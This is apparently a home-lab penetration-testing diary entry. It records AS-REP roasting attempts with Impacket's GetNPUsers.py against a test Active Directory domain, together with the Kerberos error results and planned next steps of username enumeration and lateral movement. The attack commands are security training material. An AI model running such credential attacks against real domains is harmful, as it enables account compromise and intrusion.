# 🛠️ Day X – Kerberos & Impacket Testing (May 3, 2025)

**Objective:**  
Continue attacking the Windows Server 2025 AD environment by testing Kerberos-related enumeration and exploring Impacket scripts for credential attacks.

**Target Machine:**  
- **IP:** `192.168.1.2`  
- **Hostname:** `PC.narnia.com`  
- **Domain:** `narnia.com`  
- **Attacker Machine:** Kali Linux (192.168.1.10)

---

## 🔧 Tasks Performed

### 1. ✅ Set Up Virtual Environment for Impacket
```bash
sudo apt install python3-venv -y
python3 -m venv ~/venv-impacket
source ~/venv-impacket/bin/activate
```
✅ Environment activated successfully for isolated Impacket use.

---

### 2. 🚀 Ran GetNPUsers.py for AS-REP Roasting
```bash
cd ~/impacket/examples
python3 GetNPUsers.py narnia.com/ -usersfile ~/usernames.txt -format john -dc-ip 192.168.1.2
```

**Results:**
- `KDC_ERR_C_PRINCIPAL_UNKNOWN` – Most users not found in Kerberos DB
- `UF_DONT_REQUIRE_PREAUTH` not set for administrator
- `KDC_ERR_CLIENT_REVOKED` – Some accounts are locked or disabled

---

### 3. 🐛 Errors and Troubleshooting

| Issue | Explanation | Resolution |
|-------|-------------|------------|
| KDC_ERR_C_PRINCIPAL_UNKNOWN | Usernames may not exist or typo in list | Update user list and re-test |
| UF_DONT_REQUIRE_PREAUTH | Needed for AS-REP Roasting | Identify misconfigured users |
| KDC_ERR_CLIENT_REVOKED | Indicates locked/disabled account | Likely not usable |

---

## 📌 Notes

Impacket works, but enumeration is limited.

**Next steps:**
- Refine `usernames.txt` using LDAP/SMB/enum4linux
- Use `kerbrute` for additional username discovery
- Explore lateral movement once credentials are found
